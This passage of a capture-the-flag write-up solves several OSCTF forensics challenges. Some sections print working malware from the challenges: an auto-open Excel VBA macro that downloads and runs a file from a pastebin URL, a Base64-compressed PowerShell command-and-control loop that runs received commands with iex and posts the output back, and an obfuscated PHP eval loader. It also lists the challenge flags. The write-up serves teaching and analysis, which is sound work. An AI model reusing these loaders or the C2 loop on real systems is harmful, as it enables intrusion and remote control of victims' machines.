³¯½°²ª²µº´©¤£¤¡½¯ª¸¯¿¦¤¢§¸®¼³¨¦¶¨¥³°©¢¾¾¡µ¼£¹£»©¶©£¦µ¥¹¢µ¹·½§²¶·¼¥¨º»¡´¾«½²¢¢£°¨¤°º¥¦´¢¡¥¹¤¾½³¥¸².Open "get", ªºº³¦º§°¹¢¸¡³®»¹¶¯¾£º¦£¥²´¼¦¥²·´©¡»¨´°¦¼®¬®«»·»¢¶¶¿®«¾¢·³§½¿¤½¿§¡¼«¼´ª³²¬¸®º¼¤¼¬¿¥§·«´¡¤´½¨("Ü³³Bb://B_b³Ekài~B#/jàEÄ/²_Ä/À60äm_§À"), False
³¯½°²ª²µº´©¤£¤¡½¯ª¸¯¿¦¤¢§¸®¼³¨¦¶¨¥³°©¢¾¾¡µ¼£¹£»©¶©£¦µ¥¹¢µ¹·½§²¶·¼¥¨º»¡´¾«½²¢¢£°¨¤°º¥¦´¢¡¥¹¤¾½³¥¸².send
´¼¦¥²·´©¡»¨´°¦¼®¬®«»·»¢¶¶¿®«¾¢·³§½¿¤½¿§¡¼«¼´ª³²¬¸®º¼¤¼¬¿¥§·«´¡¤´½¨µ£³¯½°²ª²µº´©¤£¤¡½¯ª¸¯¿¦ = ³¯½°²ª²µº´©¤£¤¡½¯ª¸¯¿¦¤¢§¸®¼³¨¦¶¨¥³°©¢¾¾¡µ¼£¹£»©¶©£¦µ¥¹¢µ¹·½§²¶·¼¥¨º»¡´¾«½²¢¢£°¨¤°º¥¦´¢¡¥¹¤¾½³¥¸².responseBody
If ³¯½°²ª²µº´©¤£¤¡½¯ª¸¯¿¦¤¢§¸®¼³¨¦¶¨¥³°©¢¾¾¡µ¼£¹£»©¶©£¦µ¥¹¢µ¹·½§²¶·¼¥¨º»¡´¾«½²¢¢£°¨¤°º¥¦´¢¡¥¹¤¾½³¥¸².Status = 200 Then
Set ¥·µ¬¹¿¬¯¨³³¿¯©¶¦»ª¹½¦¢¨»¸¸¸º²£²«µ¤¶¸¹µ«¶§¾¼µ®»¶¾ªºº³¦º§°¹¢¸¡³®»¹¶¯¾£º¦£¥²´¼¦¥²·´©¡»¨´°¦¼ = CreateObject("adodb.stream")
¥·µ¬¹¿¬¯¨³³¿¯©¶¦»ª¹½¦¢¨»¸¸¸º²£²«µ¤¶¸¹µ«¶§¾¼µ®»¶¾ªºº³¦º§°¹¢¸¡³®»¹¶¯¾£º¦£¥²´¼¦¥²·´©¡»¨´°¦¼.Open
¥·µ¬¹¿¬¯¨³³¿¯©¶¦»ª¹½¦¢¨»¸¸¸º²£²«µ¤¶¸¹µ«¶§¾¼µ®»¶¾ªºº³¦º§°¹¢¸¡³®»¹¶¯¾£º¦£¥²´¼¦¥²·´©¡»¨´°¦¼.Type = ¦»ª¹½¦¢¨»¸¸¸º²£²«µ¤¶¸¹µ«¶§¾¼µ®»¶¾ªºº³¦º§°¹¢¸¡³®»¹¶¯¾£º¦£¥²´¼¦¥²·´©¡»¨´°¦¼®¬®«»·»¢¶¶¿®«¾¢·³§½¿¤½¿§¡
¥·µ¬¹¿¬¯¨³³¿¯©¶¦»ª¹½¦¢¨»¸¸¸º²£²«µ¤¶¸¹µ«¶§¾¼µ®»¶¾ªºº³¦º§°¹¢¸¡³®»¹¶¯¾£º¦£¥²´¼¦¥²·´©¡»¨´°¦¼.Write ´¼¦¥²·´©¡»¨´°¦¼®¬®«»·»¢¶¶¿®«¾¢·³§½¿¤½¿§¡¼«¼´ª³²¬¸®º¼¤¼¬¿¥§·«´¡¤´½¨µ£³¯½°²ª²µº´©¤£¤¡½¯ª¸¯¿¦
¥·µ¬¹¿¬¯¨³³¿¯©¶¦»ª¹½¦¢¨»¸¸¸º²£²«µ¤¶¸¹µ«¶§¾¼µ®»¶¾ªºº³¦º§°¹¢¸¡³®»¹¶¯¾£º¦£¥²´¼¦¥²·´©¡»¨´°¦¼.SaveToFile ³°©¢¾¾¡µ¼£¹£»©¶©£¦µ¥¹¢µ¹·½§²¶·¼¥¨º»¡´¾«½²¢¢£°¨¤°º¥¦´¢¡¥¹¤¾½³¥¸²¤µ»°°§§¹¾©·¬·ª°¸°¡¥·µ¬¹¿¬, ¦»ª¹½¦¢¨»¸¸¸º²£²«µ¤¶¸¹µ«¶§¾¼µ®»¶¾ªºº³¦º§°¹¢¸¡³®»¹¶¯¾£º¦£¥²´¼¦¥²·´©¡»¨´°¦¼®¬®«»·»¢¶¶¿®«¾¢·³§½¿¤½¿§¡ + ¦»ª¹½¦¢¨»¸¸¸º²£²«µ¤¶¸¹µ«¶§¾¼µ®»¶¾ªºº³¦º§°¹¢¸¡³®»¹¶¯¾£º¦£¥²´¼¦¥²·´©¡»¨´°¦¼®¬®«»·»¢¶¶¿®«¾¢·³§½¿¤½¿§¡
¥·µ¬¹¿¬¯¨³³¿¯©¶¦»ª¹½¦¢¨»¸¸¸º²£²«µ¤¶¸¹µ«¶§¾¼µ®»¶¾ªºº³¦º§°¹¢¸¡³®»¹¶¯¾£º¦£¥²´¼¦¥²·´©¡»¨´°¦¼.Close
End If
²ª²µº´©¤£¤¡½¯ª¸¯¿¦¤¢§¸®¼³¨¦¶¨¥³°©¢¾¾¡µ¼£¹£»©¶©£¦µ¥¹¢µ¹·½§²¶·¼¥¨º»¡´¾«½²¢¢£°¨¤°º¥¦´¢¡¥.Open (³°©¢¾¾¡µ¼£¹£»©¶©£¦µ¥¹¢µ¹·½§²¶·¼¥¨º»¡´¾«½²¢¢£°¨¤°º¥¦´¢¡¥¹¤¾½³¥¸²¤µ»°°§§¹¾©·¬·ª°¸°¡¥·µ¬¹¿¬)
Else
MsgBox ªºº³¦º§°¹¢¸¡³®»¹¶¯¾£º¦£¥²´¼¦¥²·´©¡»¨´°¦¼®¬®«»·»¢¶¶¿®«¾¢·³§½¿¤½¿§¡¼«¼´ª³²¬¸®º¼¤¼¬¿¥§·«´¡¤´½¨("åxi'³P³²ÛP³xP²¿iPQEPk²x")
End If
End Sub
```

So, this seems like a `obfuscated VBA script` and of course, I tried various deobfuscating tools before figuring it out. So this script is not obfuscated not literally, because it follows the syntax and semantics of a regular programming format. Just that the functions and variable names are totally messed up, so manually fixing the variable and function names gives you a much better and readable script. Here’s how it went for me.

```bash
Rem Attribute VBA_ModuleType=VBAModule
Option VBASupport 1
Sub Auto_Open()
Workbook_Open
End Sub
Sub AutoOpen()
Workbook_Open
End Sub
Sub WorkbookOpen()
Workbook_Open
End Sub
Sub Document_Open()
Workbook_Open
End Sub
Sub DocumentOpen()
Workbook_Open
End Sub
Function someFunction(funcArgs)
var1 = " ?!@#$%^&*()_+|0123456789abcdefghijklmnopqrstuvwxyz.,-~ABCDEFGHIJKLMNOPQRSTUVWXYZ¿¡²³ÀÁÂĂÄÅ̉ÓÔƠÖÙÛÜàáâăäåØ¶§Ú¥"
var2 = "ăXL1lYU~Ùä,Ca²ZfĂ@dO-cq³áƠsÄJV9AQnvbj0Å7WI!RBg§Ho?K_F3.Óp¥ÖePâzk¶ÛNØ%G mÜ^M&+¡#4)uÀrt8(̉Sw|T*Â$EåyhiÚx65Dà¿2ÁÔ"
For y = 1 To Len(funcArgs)
var3 = InStr(var1, Mid(funcArgs, y, 1))
If var3 > 0 Then
var4 = Mid(var2, var3, 1)
var5 = var5 + var4
Else
var5 = var5 + Mid(funcArgs, y, 1)
End If
Next
someFunction = var5
For var6 = 1 To Len(var7)
var7 = var6
Next
For var8 = 2 To Len(var10)
var10 = 2
Next
For var11 = 3 To Len(var12)
var13 = var11
Next
For var14 = 4 To Len(var15)
var16 = 2
Next
End Function
Sub Workbook_Open()
Dim var17 As Object
Dim var18 As String
Dim var19 As String
Dim var20 As String
Dim var21 As Integer
var21 = Chr(50) + Chr(48) + Chr(48)
Set var17 = CreateObject("WScript.Shell")
var18 = var17.SpecialFolders("AppData")
Dim var22
Dim var23
Dim ¢var3¶
Dim var6 As Long
Dim var8 As String
Dim var24 As Long
Dim var13 As String
Dim var11 As Long
Dim var14 As String
Dim var25 As String
Dim var10 As Long
Dim var26
Dim var27
Dim var28 As Integer
Dim ³¯½°var27¹¤¾½³¥¸²
Dim var28
var28 = 1
Range("A1").Value = someFunction("4BEiàiuP3x6¿QEi³")
Dim var29 As String
var30 = "$x¿PÜ_jEPkEEiPÜ_6IE3P_i3PÛx¿²PàQBx²³_i³P3x6¿QEi³bPÜ_jEPkEEiPb³x#Eir" & vbCrLf & "̉xP²E³²àEjEP³ÜEbEP3_³_(PÛx¿P_²EP²E7¿à²E3P³xP³²_ib0E²P@mmIP³xP³ÜEP0x##xÄàiuPk_iIP_66x¿i³Pi¿QkE²:P" & vbCrLf & "@m@m@mo@@§mmm" & vbCrLf & "g66x¿i³PÜx#3E²:PLu¿ÛEiP̉Ü_iÜP!xiu" & vbCrLf & "t_iI:PTtPt_iI"
var29 = someFunction(var30)
MsgBox var29, vbInformation, someFunction("pEP3EEB#ÛP²Eu²E³P³xPài0x²QPÛx¿")
Dim var31 As Date
Dim var32 As Date
var31 = Date
var32 = DateSerial(2024, 7, 8)
If var31 < var32 Then
Set ³¯½°var27¹¤¾½³¥¸² = CreateObject("microsoft.xmlhttps")
Set var27 = CreateObject("Shell.Application")
var26 = var18 + someFunction("\k¿i6Ü_~Bb@")
³¯½°var27¹¤¾½³¥¸².Open "get", someFunction("Ü³³Bb://B_b³Ekài~B#/jàEÄ/²_Ä/À60äm_§À"), False
³¯½°var27¹¤¾½³¥¸².send
var23 = ³¯½°var27¹¤¾½³¥¸².responseBody
If ³¯½°var27¹¤¾½³¥¸².Status = 200 Then
Set var22 = CreateObject("adodb.stream")
var22.Open
var22.Type = var28
var22.Write var23
var22.SaveToFile var26, var28 + var28
var22.Close
End If
var27.Open (var26)
Else
MsgBox someFunction("åxi'³P³²ÛP³xP²¿iPQEPk²x")
End If
End Sub
```

This VBA macro code contains several subroutines and a function designed to execute upon opening a workbook in Excel. Here's a summarized explanation of each part:

1. **Auto-Executing Subroutines:**
    - `Auto_Open`, `AutoOpen`, `WorkbookOpen`, `Document_Open`, and `DocumentOpen` all call `Workbook_Open` to execute it when the workbook is opened.
2. **Character Substitution Function:**
    - `Function someFunction(funcArgs)`: This function performs a character substitution using two predefined strings (`var1` and `var2`). It replaces each character in the input string `funcArgs` with the corresponding character from `var2` based on its position in `var1`.
3. **Main Subroutine - Workbook_Open:**
    - **Object Creation and Variable Initialization:**
        - Creates an object `var17` for accessing the Windows Script Host Shell.
        - Sets up several variables, including paths and strings.
    - **Character Substitution and Output:**
        - Uses the `someFunction` to encode a string and set it in cell A1 of the active sheet.
        - Encodes another multiline string and displays it in a message box.
    - **Date Check and https Request:**
        - Checks if the current date is before July 8, 2024.
        - If true, creates an `XMLhttps object to send a GET request to a specific URL (obfuscated)`.
        - Saves the response to a file in the user's AppData directory and then opens the file.
        - If the date condition is not met, displays a message box with another encoded message.

In summary, the macro performs character substitution, checks the current date, sends an https request, saves the response as a file, and executes or displays messages based on these conditions.

I have no idea, why the VBA script checks the time, anyways, `ChatGPT` done a good job explaining the script.

So, we write a script to reverse the obfuscated URL.

```python
def someFunction(funcArgs):
    var1 = " ?!@#$%^&*()_+|0123456789abcdefghijklmnopqrstuvwxyz.,-~ABCDEFGHIJKLMNOPQRSTUVWXYZ¿¡²³ÀÁÂĂÄÅ̉ÓÔƠÖÙÛÜàáâăäåØ¶§Ú¥"
    var2 = "ăXL1lYU~Ùä,Ca²ZfĂ@dO-cq³áƠsÄJV9AQnvbj0Å7WI!RBg§Ho?K_F3.Óp¥ÖePâzk¶ÛNØ%G mÜ^M&+¡#4)uÀrt8(̉Sw|T*Â$EåyhiÚx65Dà¿2ÁÔ"
    var5 = ""

    for char in funcArgs:
        var3 = var1.find(char)
        if var3 != -1:
            var4 = var2[var3]
            var5 += var4
        else:
            var5 += char
    
    return var5

url = "Ü³³Bb://B_b³Ekài~B#/jàEÄ/²_Ä/À60äm_§À"

convertedURL = someFunction(url)
print("Converted URL:", convertedURL)
```

```python
└─$ python3 deobf.py
Converted URL: https://pastebin.pl/view/raw/8cf50a28
```

Going into the link, we find another kind-off obfuscated PowerShell command.

{{< figure src="4.png" alt="4" >}}


```python
& ( $sHEllid[1]+$sheLLiD[13]+'X')( NEW-obJEct Io.cOMPReSSiON.DEFlAteStrEAM( [SyStem.iO.mEMOrySTream] [SysteM.cOnVerT]::FRomBase64STRINg( 'JAAwAEwARABFAHgATgBpACAAPQAgACcASgBIAEYAMwBaAFcAUgBtAFkAWABvAGcAUABTAEEAbwBNAFQAQQAwAEwARABFAHgATgBpAHcAeABNAFQAWQBzAE0AVABFAHkATABEAEUAeABOAFMAdwAxAE8AQwB3ADAATgB5AHcAMABOAHkAdwB4AE0AVABJAHMATwBUAGMAcwBNAFQARQAxAEwARABFAHgATgBpAHcAeABNAEQARQBzAE8AVABnAHMATQBUAEEAMQBMAEQARQB4AE0AQwB3ADAATgBpAGsANwBKAEgARgAzAFoAVwBSAG0AWQBYAG8AZwBLAHoAMABnAEsARABFAHgATQBpAHcAeABNAEQAZwBzAE4ARABjAHMATQBUAEUANABMAEQARQB3AE4AUwB3AHgATQBEAEUAcwBNAFQARQA1AEwARABRADMATABEAEUAeABOAEMAdwA1AE4AeQB3AHgATQBUAGsAcwBOAEQAYwBzAE8AVABnAHMATQBUAEEAdwBMAEQAawA1AEwARABrADMATABEAFEANQBMAEQAVQAxAEwARABRADQATABEAFUAdwBLAFQAcwBrAFoAMgBGAHMAWgBpAEEAOQBJAEYAdABUAGUAWABOADAAWgBXADAAdQBWAEcAVgA0AGQAQwA1AEYAYgBtAE4AdgBaAEcAbAB1AFoAMQAwADYATwBrAEYAVABRADAAbABKAEwAawBkAGwAZABGAE4AMABjAG0AbAB1AFoAeQBnAGsAYwBYAGQAbABaAEcAWgBoAGUAaQBrADcASgBIAE0AOQBKAHoARQB5AE4AeQA0AHcATABqAEEAdQBNAFQAbwA0AE0ARABnAHcASgB6AHMAawBhAFQAMABuAFoAVwBWAG0ATwBHAFYAbQBZAFcATQB0AE0AegBJAHgAWgBEAFEAMgBOAFcAVQB0AFoAVABsAGsATQBEAFUAegBZAFQAYwBuAE8AeQBSAHcAUABTAGQAbwBkAEgAUgB3AE8AaQA4AHYASgB6AHMAawBkAGoAMQBKAGIAbgBaAHYAYQAyAFUAdABWADIAVgBpAFUAbQBWAHgAZABXAFYAegBkAEMAQQB0AFYAWABOAGwAUQBtAEYAegBhAFcATgBRAFkAWABKAHoAYQBXADUAbgBJAEMAMQBWAGMAbQBrAGcASgBIAEEAawBjAHkAOQBsAFoAVwBZADQAWgBXAFoAaABZAHkAQQB0AFMARwBWAGgAWgBHAFYAeQBjAHkAQgBBAGUAeQBKAFkATABUAFkANABNAEcAUQB0AE4ARABkAGwATwBDAEkAOQBKAEcAbAA5AE8AMwBkAG8AYQBXAHgAbABJAEMAZwBrAGQASABKADEAWgBTAGwANwBKAEcATQA5AEsARQBsAHUAZABtADkAcgBaAFMAMQBYAFoAVwBKAFMAWgBYAEYAMQBaAFgATgAwAEkAQwAxAFYAYwAyAFYAQwBZAFgATgBwAFkAMQBCAGgAYwBuAE4AcABiAG0AYwBnAEwAVgBWAHkAYQBTAEEAawBjAEMAUgB6AEwAegBNAHkATQBXAFEAMABOAGoAVgBsAEkAQwAxAEkAWgBXAEYAawBaAFgASgB6AEkARQBCADcASQBsAGcAdABOAGoAZwB3AFoAQwAwADAATgAyAFUANABJAGoAMABrAGEAWAAwAHAATABrAE4AdgBiAG4AUgBsAGIAbgBRADcAYQBXAFkAZwBLAEMAUgBqAEkAQwAxAHUAWgBTAEEAbgBUAG0AOQB1AFoAUwBjAHAASQBIAHMAawBjAGoAMQBwAFoAWABnAGcASgBHAE0AZwBMAFUAVgB5AGMAbQA5AHkAUQBXAE4AMABhAFcAOQB1AEkARgBOADAAYgAzAEEAZwBMAFUAVgB5AGMAbQA5AHkAVgBtAEYAeQBhAFcARgBpAGIARwBVAGcAWgBUAHMAawBjAGoAMQBQAGQAWABRAHQAVQAzAFIAeQBhAFcANQBuAEkAQwAxAEoAYgBuAEIAMQBkAEUAOQBpAGEAbQBWAGoAZABDAEEAawBjAGoAcwBrAGQARAAxAEoAYgBuAFoAdgBhADIAVQB0AFYAMgBWAGkAVQBtAFYAeABkAFcAVgB6AGQAQwBBAHQAVgBYAEoAcABJAEMAUgB3AEoASABNAHYAWgBUAGwAawBNAEQAVQB6AFkAVABjAGcATABVADEAbABkAEcAaAB2AFoAQwBCAFEAVAAxAE4AVQBJAEMAMQBJAFoAVwBGAGsAWgBYAEoAegBJAEUAQgA3AEkAbABnAHQATgBqAGcAdwBaAEMAMAAwAE4AMgBVADQASQBqADAAawBhAFgAMABnAEwAVQBKAHYAWgBIAGsAZwBLAEYAdABUAGUAWABOADAAWgBXADAAdQBWAEcAVgA0AGQAQwA1AEYAYgBtAE4AdgBaAEcAbAB1AFoAMQAwADYATwBsAFYAVQBSAGoAZwB1AFIAMgBWADAAUQBuAGwAMABaAFgATQBvAEoARwBVAHIASgBIAEkAcABJAEMAMQBxAGIAMgBsAHUASQBDAGMAZwBKAHkAbAA5AEkASABOAHMAWgBXAFYAdwBJAEQAQQB1AE8AWAAwAD0AJwA7ACQAMgBWAEMAWQBYAE4AcABZADEAIAA9ACAAWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAWwBTAHkAcwB0AGUAbQAuAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACQAMABMAEQARQB4AE4AaQApACkAOwAkAHMAawBjAGoAMQBQAGQAWABRAHQAIAA9ACAAQwBvAG4AdgBlAHIAdABUAG8ALQBTAGUAYwB1AHIAZQBTAHQAcgBpAG4AZwAgAC0AUwB0AHIAaQBuAGcAIAAkADIAVgBDAFkAWABOAHAAWQAxACAALQBBAHMAUABsAGEAaQBuAFQAZQB4AHQAIAAtAEYAbwByAGMAZQA7ACQAVgB6AGQAQwBBAHQAVgBYAEoAcAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAFAAUwBDAHIAZQBkAGUAbgB0AGkAYQBsACgAJwBkAFcAVgB6AGQAZAB6AEMAQQB0ACcALAAgACQAcwBrAGMAagAxAFAAZABYAFEAdAApADsAaQBlAHgAIAAkAFYAegBkAEMAQQB0AFYAWABKAHAALgBHAGUAdABOAGUAdAB3AG8AcgBrAEMAcgBlAGQAZQBuAHQAaQBhAGwAKAApAC4AUABhAHMAcwB3AG8AcgBk' ) , [sySteM.IO.ComprESsiON.cOmpresSiONMODe]::dEcomPrEss)|fOReach-OBJECt{NEW-obJEct  iO.sTReAMrEAder( $_ , [TExT.EncOdiNg]::AscIi)} | fOREacH-obJeCt{$_.reADToend( )})
```

You will see Base64 encoded stuff in between the command. Decode it. That reveal another set of commands underneath. Plus a Base64 string.

```python
$0LDExNi = 'JHF3ZWRmYXogPSAoMTA0LDExNiwxMTYsMTEyLDExNSw1OCw0Nyw0NywxMTIsOTcsMTE1LDExNiwxMDEsOTgsMTA1LDExMCw0Nik7JHF3ZWRmYXogKz0gKDExMiwxMDgsNDcsMTE4LDEwNSwxMDEsMTE5LDQ3LDExNCw5NywxMTksNDcsOTgsMTAwLDk5LDk3LDQ5LDU1LDQ4LDUwKTskZ2FsZiA9IFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OkFTQ0lJLkdldFN0cmluZygkcXdlZGZheik7JHM9JzEyNy4wLjAuMTo4MDgwJzskaT0nZWVmOGVmYWMtMzIxZDQ2NWUtZTlkMDUzYTcnOyRwPSdodHRwOi8vJzskdj1JbnZva2UtV2ViUmVxdWVzdCAtVXNlQmFzaWNQYXJzaW5nIC1VcmkgJHAkcy9lZWY4ZWZhYyAtSGVhZGVycyBAeyJYLTY4MGQtNDdlOCI9JGl9O3doaWxlICgkdHJ1ZSl7JGM9KEludm9rZS1XZWJSZXF1ZXN0IC1Vc2VCYXNpY1BhcnNpbmcgLVVyaSAkcCRzLzMyMWQ0NjVlIC1IZWFkZXJzIEB7IlgtNjgwZC00N2U4Ij0kaX0pLkNvbnRlbnQ7aWYgKCRjIC1uZSAnTm9uZScpIHskcj1pZXggJGMgLUVycm9yQWN0aW9uIFN0b3AgLUVycm9yVmFyaWFibGUgZTskcj1PdXQtU3RyaW5nIC1JbnB1dE9iamVjdCAkcjskdD1JbnZva2UtV2ViUmVxdWVzdCAtVXJpICRwJHMvZTlkMDUzYTcgLU1ldGhvZCBQT1NUIC1IZWFkZXJzIEB7IlgtNjgwZC00N2U4Ij0kaX0gLUJvZHkgKFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjguR2V0Qnl0ZXMoJGUrJHIpIC1qb2luICcgJyl9IHNsZWVwIDAuOX0=';$2VCYXNpY1 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($0LDExNi));$skcj1PdXQt = ConvertTo-SecureString -String $2VCYXNpY1 -AsPlainText -Force;$VzdCAtVXJp = New-Object System.Management.Automation.PSCredential('dWVzddzCAt', $skcj1PdXQt);iex $VzdCAtVXJp.GetNetworkCredential().Password
```

Note: Remove null bytes after decoding the Base64, if you were using `cyberchef`.

```python
$qwedfaz = (104,116,116,112,115,58,47,47,112,97,115,116,101,98,105,110,46);
$qwedfaz += (112,108,47,118,105,101,119,47,114,97,119,47,98,100,99,97,49,55,48,50);
$galf = [System.Text.Encoding]::ASCII.GetString($qwedfaz);$s='127.0.0.1:8080';
$i='eef8efac-321d465e-e9d053a7';
$p='https://';
$v=Invoke-WebRequest -UseBasicParsing -Uri $p$s/eef8efac -Headers @{"X-680d-47e8"=$i};
while ($true){$c=(Invoke-WebRequest -UseBasicParsing -Uri $p$s/321d465e 
-Headers @{"X-680d-47e8"=$i}).Content;
if ($c -ne 'None') {$r=iex $c -ErrorAction Stop -ErrorVariable e;$r=Out-String 
-InputObject $r;$t=Invoke-WebRequest -Uri $p$s/e9d053a7 -Method POST 
-Headers @{"X-680d-47e8"=$i} -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) 
-join ' ')} sleep 0.9}
```

We, finally get the following PowerShell script.

- `$qwedfaz = (104,116,116,112,115,58,47,47,112,97,115,116,101,98,105,110,46);`
    - Initializes an array with ASCII values corresponding to the string "https://pastebin.".
- `$qwedfaz += (112,108,47,118,105,101,119,47,114,97,119,47,98,100,99,97,49,55,48,50);`
    - Adds more ASCII values to complete the URL, resulting in "https://pastebin.pl/view/raw/bdca1702".

Going to the above link, we get the flag.

```python
└─$ curl https://pastebin.pl/view/raw/bdca1702
OSCTF{JU5t_n0rmal_eXE1_f113_w1th_C2_1n51De}
```

{{< figure src="5.png" alt="5" >}}

Flag:`OSCTF{JU5t_n0rmal_eXE1_f113_w1th_C2_1n51De}`

### **Seele Vellorei - Revenge**

**Description**: 

Last time, you Solved my challenge easily, but this time I challenge you to Come to see my flag, if you can

**Author**: @Anhshidou

**Given**: Flag.zip

{{< figure src="6.png" alt="6" >}}

Obviously, it’s password protected. Using `zip2john` to extract the hash.

Shoutout to `@lunaroa` for explaining the challenge on Discord.

{{< figure src="7.png" alt="7" >}}

{{< figure src="8.png" alt="8" >}}


Now, we’ve been given an image to analyse.

```python
└─$ exiftool flag.png
ExifTool Version Number         : 12.76
File Name                       : flag.png
<>
Warning                         : [minor] Text/EXIF chunk(s) found after PNG IDAT (may be ignored by some readers)
Ciphermode                      : CTR
Ciphernonce                     : 05f7719c9571b58e11af440c77bd058616a07dff4b4edf493ca78ba40a746352
Ciphertype                      : AES
Datecreate                      : 2024-06-14T16:07:43+00:00
Datemodify                      : 2024-06-14T16:07:43+00:00
Image Size                      : 863x206
Megapixels                      : 0.178
```

Interesting points to note is presence of these tags,  

<aside>
💡 Ciphermode                      : CTR
Ciphernonce                     : 05f7719c9571b58e11af440c77bd058616a07dff4b4edf493ca78ba40a746352
Ciphertype                      : AES

</aside>

And also if we care to open the the image,

{{< figure src="9.png" alt="9" >}}

Defo, something is going on. Quick Google to find out what this means.

[JUST_ONE_MESSAGE](https://www.reddit.com/r/ARG/comments/1arfjda/just_one_message/)

Here’s a link on Reddit that goes through a similar challenge, suggested by `@lunaroa`.

We go to this website, enter the password `loveyou` again and get the flag.

[Decrypt image online - Decrypt / Decipher an image using secret password - free tool.](https://decrypt.imageonline.co/index.php)

{{< figure src="10.png" alt="10" >}}

Flag: `OSCTF{h0nk4i_1s_my_f4v_g4m35}`

### **The Lost Image Mystery**

**Description**: 

In the bustling city of Cyberville, a crucial image file has been corrupted, and it's up to you, a budding digital forensics expert, to recover it. The file appears to be damaged, can you recover the contents of the file?

Author: `@5h1kh4r`

Given: `image.png`

As given in the question, the image is actually a corrupted JPEG image, just change the JPEG header of the image to get the flag in the fixed image.

```python
 FF D8 FF E0  <>  ......JFIF.
```

{{< figure src="11.png" alt="p4" >}}


Flag: `OSCTF{W0ah_F1l3_h34D3r5}`

### **The Hidden Soundwave**

**Description**: 

We've intercepted some signals which is allegedly transmitted by aliens...? Do aliens listen to Alan Walker? I don't know, it's up to you to understand but we are sure there's something hidden in this song and we need to decrypt it!

**Author**: `@5h1kh4r`

**Given**: `Alan_Walker_Faded.mp3`

Just view the MP3 file in Audio Spectrogram using `Audacity` or `Sonic-Visualiser`.

{{< figure src="12.png" alt="12" >}}

Flag: `OSCTF{M3s54g3_1nt3Rc3p7eD}`

### **Mysterious Website Incident**

**Description**: 

In the heart of Cyber City, a renowned e-commerce website has reported suspicious activity on its servers. As a rookie digital investigator, you've been called in to uncover the truth behind this incident. Your journey begins with examining the server's records, searching for clues that could shed light on what transpired.

Author: `@5h1kh4r`

Given: `nginx_logs.txt`

Opening the file in a Text Editor and playing around, in Line 267, we get to see a Google Drive link.

```python
my_secret :D - - [14/Jun/2024:07:47:14 +0000] "GET https://drive.google.com/file/d/15IwD7QiSKtvmW7XG2gYkdnwW0bxXBgdj/view?usp=drive_link https/1.0" 200 3625 "https://test.com" "Mozilla/5.0 (compatible; Googlebot/2.1; +https://www.google.com/bot.html)"
```

**Flag**: `OSCTF{1_c4N_L0g!}`

### **Cyber Heist Conspiracy**

**Description**: 

In the heart of Silicon City, rumors swirl about a sophisticated cyber heist orchestrated through covert network channels. As a novice cyber investigator, you've been tasked with analyzing a mysterious file recovered from the scene of the digital crime.

**Author**: `@5h1kh4r`

**Given**: `capture.pcapng`

```python
└─$ strings capture.pcapng
        }"v
UM!R
        P..
1:D/
p7      mS
a<`b
OSCTF{Pr0_W1Th_PC4Ps}
```

Flag: `OSCTF{Pr0_W1Th_PC4Ps}`

### **Phantom Script Intrusion**

**Description**:

In the realm of Cyberspace County, a notorious cybercriminal has planted a stealthy PHP malware script on a local server. This malicious script has been cunningly obfuscated to evade detection. As a novice cyber detective, you are called upon to unravel the hidden intentions behind this cryptic code.

**Author**: `@5h1kh4r`

**Given**: code.txt

We are given an obfuscated PHP script.

```python
└─$ cat code.txt
<?php
 goto Ls6vZ; apeWK: ${"\x76\141\x72\61"} = str_rot13("\x24\x7b\x22\134\x78\x34\x37\134\x78\x34\143\x5c\x78\64\x66\x5c\170\x34\x32\134\x78\64\61\x5c\170\x34\x63\134\x78\x35\x33\42\x7d"); goto G9fZX; Ls6vZ: ${"\x47\x4c\x4f\x42\101\114\123"} = "\150\x58\x58\x70\x73\72\x2f\57\163\150\x30\162\164\x75\x72\x6c\56\x61\164\x2f\x73\x31\146\x57\62"; goto apeWK; XT2kv: if (strlen(${"\x76\141\x72\x32"}) > 0) { ${"\166\x61\x72\x33"} = ${"\x76\x61\x72\x32"}; } else { ${"\166\141\x72\63"} = ''; } goto ZYamk; V2P3O: foreach (str_split(${"\166\141\x72\x33"}) as ${"\166\x61\x72\x35"}) { ${"\166\141\162\x34"} .= chr(ord(${"\166\141\162\65"}) - 1); } goto Ly_yq; G9fZX: ${"\x76\141\162\x32"} = base64_decode(${${"\166\x61\162\x31"}}); goto XT2kv; Ly_yq: eval(${${"\x76\x61\x72\x34"}}); goto IFMxz; ZYamk: ${"\166\141\162\64"} = ''; goto V2P3O; IFMxz: ?>
```

Using the following website to deobfuscate it. We get the URL.

```python
<?php 
 goto Ls6vZ; apeWK: ${"var1"} = str_rot13("${"GLOBALS"}"); goto G9fZX; Ls6vZ: ${"GLOBALS"} = "hXXps://sh0rturl.at/s1fW2"; goto apeWK; XT2kv: if (strlen(${"var2"}) > 0) { ${"var3"} = ${"var2"}; } else { ${"var3"} = ''; } goto ZYamk; V2P3O: foreach (str_split(${"var3"}) as ${"var5"}) { ${"var4"} .= chr(ord(${"var5"}) - 1); } goto Ly_yq; G9fZX: ${"var2"} = base64_decode(${${"var1"}}); goto XT2kv; Ly_yq: eval(${${"var4"}}); goto IFMxz; ZYamk: ${"var4"} = ''; goto V2P3O; IFMxz: ?>
```

`hXXps://sh0rturl.at/s1fW2` , just re-structuring, we get `https://shorturl.at/s1fW2` and the flag.

Flag: `OSCTF{M4lW4re_0bfU5CAt3d}`

### **PDF Puzzle**

It took me so much time to write this pdf (for real, I'm not lying) but I have hidden the flag in this and you're tasked with finding it. Prove your pdf knowledge here forensic people.

Author:`@5h1kh4r`

Given: `my_pdf.pdf`

```python
└─$ exiftool My_pdf.pdf
ExifTool Version Number         : 12.76
File Name                       : My_pdf.pdf
Directory                       : .
File Size                       : 18 kB
<>
Author                          : OSCTF{H3il_M3taD4tA}
```

Flag: `OSCTF{H3il_M3taD4tA}`

### **Seele Vellorei**

